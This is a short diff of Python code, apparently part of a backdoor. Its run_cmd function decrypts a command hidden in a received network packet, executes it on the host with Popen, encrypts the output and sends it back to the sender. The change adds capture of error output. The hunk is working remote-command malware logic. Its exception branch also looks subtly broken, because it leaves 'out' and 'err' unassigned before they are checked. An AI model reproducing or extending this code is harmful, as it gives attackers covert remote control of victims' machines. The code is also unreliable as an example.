@@ -126,18 +126,23 @@ def send_data(destIP, port, data):
 def run_cmd(packet):
     data = packet['Raw'].load
     data = decrypt_val(data)
+    output = []
     try:
         command, arguments = data.split(' ', 1)
     except ValueError:
         arguments = None
     try:
         if(arguments is not None):
-            output = Popen([command, arguments], stdout=PIPE).communicate()[0]
+            out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
         else:
-            output = Popen(data, stdout=PIPE).communicate()[0]
+            out, err = Popen(data, stdout=PIPE, stderr=PIPE).communicate()
     except OSError:
         output = "Invalid Command / Command not found"
-    output = encrypt_val(output)
+    if(out):
+        output.append(out)
+    if(err):
+        output.append(err)
+    output = encrypt_val("".join(output))
     time.sleep(0.1)
     send_data(packet[1].src, packet[2].sport, output)
 
